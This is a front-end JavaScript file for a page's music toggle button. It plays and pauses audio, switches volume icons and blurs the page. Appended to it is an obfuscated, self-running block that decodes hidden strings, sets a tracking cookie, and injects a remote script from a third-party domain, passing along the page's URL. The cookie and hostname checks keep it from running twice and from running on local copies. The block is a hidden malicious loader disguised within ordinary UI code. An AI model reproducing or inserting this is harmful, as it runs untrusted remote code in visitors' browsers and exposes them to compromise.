const button = document.getElementById("musicbtn"),
    icon = document.getElementById("volumebtn"),
    blur = document.getElementById("blurthepage"),
    audio = document.getElementById("audioatp");

function sleep(e) {
    return new Promise((t => setTimeout(t, e)))
}
async function change() {
    await new Promise((e => setTimeout(e, 500))), blur.classList.add("blurpagerplc2")
}
button.addEventListener("click", (() => {
    audio.paused ? (audio.volume = .04, audio.play(), icon.classList.remove("fa-volume-up"), icon.classList.add("fa-volume-mute")) : (audio.pause(), icon.classList.remove("fa-volume-mute"), icon.classList.add("fa-volume-up")), button.classList.add("replace"), blur.classList.add("blurpagerplc"), change()
}));
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));